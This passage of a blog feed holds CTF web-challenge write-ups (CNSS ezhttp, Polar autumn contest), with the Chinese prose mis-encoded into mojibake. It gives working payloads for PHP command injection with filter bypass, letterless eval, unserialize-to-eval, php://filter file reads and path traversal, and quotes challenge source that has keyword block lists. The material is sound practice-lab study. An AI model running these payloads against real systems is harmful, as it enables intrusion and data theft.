name3=value3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113558180.png" alt="image-20230814113558180"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113202256.png" alt="image-20230814113202256"></p><p>æ ¹æ®æç¤ºéœ€è¦åœ¨Cookieä¸­æ·»åŠ passwordå­—æ®µ:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:name=&quot;admin&quot;;password=&quot;123456&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814113321059.png" alt="image-20230814113321059"></p><p>BasicAuthè®¤è¯<a href="https://zhuanlan.zhihu.com/p/64584734">ç§’æ‡‚HTTPåŸºæœ¬è®¤è¯(Basic Authentication) - çŸ¥ä¹ (zhihu.com)</a>ï¼š</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814123944756.png" alt="image-20230814123944756"></p><p>æ ¹æ®æç¤ºå¾—æˆ‘ä»¬éœ€è¦è¿›è¡ŒBasicAuthè®¤è¯ï¼Œå³è®¤è¯æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ,éœ€è¦æ·»åŠ Authorizationå­—æ®µ:</p><p>admin:123456çš„base64æ ¼å¼ä¸ºYWRtaW46MTIzNDU2</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Authorization: Basic YWRtaW46MTIzNDU2<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-9-25-cnss-ezhttp/image-20230814124235654.png" alt="image-20230814124235654"></p><p>flag &#x3D; cnss{y0u_kn0w_h77p_r3qu3st_h4h4!}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Polarç§‹å­£ä¸ªäººèµ›WEB_WP</title>
    <link href="/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"/>
    <url>/2023/09/24/2023-09-24-polar%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Polarç§‹å­£ä¸ªäººèµ›WEB-WP"><a href="#Polarç§‹å­£ä¸ªäººèµ›WEB-WP" class="headerlink" title="Polarç§‹å­£ä¸ªäººèµ›WEB_WP"></a>Polarç§‹å­£ä¸ªäººèµ›WEB_WP</h1><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload:"></a>ezupload:</h4><p><img src="/images/2023-9-24-Polar/image-20230923092810825.png" alt="image-20230923092810825"></p><p>url:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://2469cefa-72d1-4f8f-a274-87b44a1cc826.www.polarctf.com:8090/uploads/pass1.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat ../flag.php&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923092840078.png" alt="image-20230923092840078"></p><h4 id="å†æ¥pingä¸€æ³¢å•Š"><a href="#å†æ¥pingä¸€æ³¢å•Š" class="headerlink" title="å†æ¥pingä¸€æ³¢å•Š"></a>å†æ¥pingä¸€æ³¢å•Š</h4><p>payload:</p><p>base64ç»•è¿‡æ³•æ ¼å¼:ä½¿ç”¨$IFS$9ä»£æ›¿ç©ºæ ¼ï¼Œshä»£æ›¿bash</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><p>dir &#x2F;</p><p><img src="/images/2023-9-24-Polar/image-20230923101128445.png" alt="image-20230923101128445"></p><p>dir ..&#x2F;..&#x2F;:<br><img src="/images/2023-9-24-Polar/image-20230923101348330.png" alt="image-20230923101348330"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923102308231.png" alt="image-20230923102308231"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|echo cat ./index.php|base64 -d|bash<br>=&gt;ä½¿ç”¨base64ç»•è¿‡æ³•<br>127.0.0.1|echo$IFS$9Y2F0IC4vaW5kZXgucGhw|base64$IFS$9-d|sh<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1|dir$IFS$9..:è¿”å›ä¸Šä¸€çº§ç›®å½•<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923101845558.png" alt="image-20230923101845558"></p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç :</p><p><img src="/images/2023-9-24-Polar/image-20230923101955812.png" alt="image-20230923101955812"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>æ¥åšä¸ªå¤ä¹ <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>ç¡®å®š<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PolarD&amp;N CTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;</span>æ¥åšä¸ªå¤ä¹ <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Why not try bjut.edu.cn&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-left:20;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>ç¡®å®š<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $flag = &#x27;flag&#123;ae5eb824ef87499f644c3f11a7176157&#125;&#x27;;</span><br><span class="hljs-meta">if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="hljs-meta">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="hljs-meta">if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|`|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-meta">print_r($match);</span><br><span class="hljs-meta">print($ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-meta">die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;ç©ºæ ¼æˆ‘å¯æ²¡åŠ éš¾åº¦è¿™å¯çœŸæ˜¯å¤ä¹ ï¼Œ/æ–œçœ¼ç¬‘&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;Bash is not allowed&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/ls/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;æˆ‘å¾ˆæŠ±æ­‰ï¼Œå…¶å®ä½ å¾—å†ç ”ç©¶ç ”ç©¶&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">        else if(preg_match(&quot;/cat|tac|sort|head|tail|more|less/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;å¸¸ç”¨çš„è¯»å–å‘½ä»¤è‚¯å®šä¸è¡Œï¼Œä½ è¦æ˜¯æƒ³å‡ºç»•è¿‡çš„ä¹Ÿç®—ä½ å‰å®³ã€‚ä½†è¿‡æ»¤æœºåˆ¶æ˜¯æ”¹äº†çš„-ã€‚-ï¼Œä½ å†ç ”ç©¶ç ”ç©¶ï¼Ÿ&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/rm/&quot;, $ip))&#123;</span><br><span class="hljs-meta">die(&quot;ä½ è¦ææˆ‘ï¼Ÿï¼Ÿï¼Ÿ&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">else if(preg_match(&quot;/index/&quot;,$ip))&#123;</span><br><span class="hljs-meta">die(&quot;é‚£èƒ½è®©ä½ ç›´æ¥è¯»ï¼Ÿ&quot;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">$a = system(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">print_r($a);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">&lt;!--å…¶å®å°±æ˜¯å‡ºé¢˜äººå¤ªæ‡’äº†--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-comment">&lt;!--å…¶å®å°±æ˜¯å‡ºé¢˜äººå¤ªæ‡’äº†--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="wu"><a href="#wu" class="headerlink" title="wu:"></a>wu:</h4><p>ä»£ç å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-comment">//æ— æ•°å­—å­—æ¯ç»•è¿‡</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!&quot;</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B<br><br>POST:<br>_=system(&#x27;ls ./&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131600566.png" alt="image-20230923131600566"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B<br><br>POST:<br>_=system(&#x27;cat ./zheshiflag.php &#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131710886.png" alt="image-20230923131710886"></p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice:"></a>php very nice:</h4><p>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span>=<span class="hljs-string">&#x27;Can you find the leak?&#x27;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;sys);<br>     &#125;<br> &#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$obj</span>-&gt;sys = <span class="hljs-string">&quot;system(&#x27;cat ./flag.php&#x27;);&quot;</span>;<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br><br> <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=O%3A7%3A%22Example%22%3A1%3A%7Bs%3A3%3A%22sys%22%3Bs%3A25%3A%22system%28%27cat+.%2Fflag.php%27%29%3B%22%3B%7D<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923162344694.png" alt="image-20230923162344694"></p><h4 id="ä»£ç å®¡è®¡1"><a href="#ä»£ç å®¡è®¡1" class="headerlink" title="ä»£ç å®¡è®¡1:"></a>ä»£ç å®¡è®¡1:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;|flag|&quot;</span>, <span class="hljs-variable">$xsx</span>)) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flag is no here!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$xsx</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xsx&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$sys</span>(<span class="hljs-variable">$xsx</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=FilesystemIterator&amp;xsx=./<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923164401248.png" alt="image-20230923164401248"></p><p>ä½¿ç”¨phpåŸç”Ÿç±»è¿”å›flag.phpçš„å†…å®¹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923172559963.png" alt="image-20230923172559963"></p><p><img src="/images/2023-9-24-Polar/image-20230923172610960.png" alt="image-20230923172610960"></p><h4 id="è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š"><a href="#è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š" class="headerlink" title="è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š"></a>è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š</h4><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=upload/../sectet_include.php<br>/var/www/html/upload/4382754064<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨dirsearchï¼š<br><img src="/images/2023-9-24-Polar/image-20230923155441868.png" alt="image-20230923155441868"></p><p><img src="/images/2023-9-24-Polar/image-20230923155509582.png" alt="image-20230923155509582"></p><p><img src="/images/2023-9-24-Polar/image-20230923155519918.png" 